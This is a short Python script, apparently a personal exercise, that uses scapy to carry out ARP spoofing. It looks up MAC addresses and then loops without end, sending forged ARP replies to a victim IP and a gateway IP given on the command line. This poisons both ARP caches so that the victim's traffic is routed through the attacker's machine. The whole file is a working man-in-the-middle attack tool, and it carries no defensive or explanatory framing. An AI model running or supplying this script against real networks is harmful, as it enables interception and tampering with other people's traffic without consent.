import scapy.all as scapy
import sys
import time
from datetime import datetime

author = "Roshitha"
current_date = datetime.now().strftime("%d/%m/%Y")
print(f"Author: {author}\nDate: {current_date}")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # op=2 makes it an ARP reply
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )

    scapy.sendp(packet, verbose=False)

# Get IPs from command line arguments 
victim_ip = sys.argv[1]
gateway_ip = sys.argv[2]

try:
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping Spoof...")
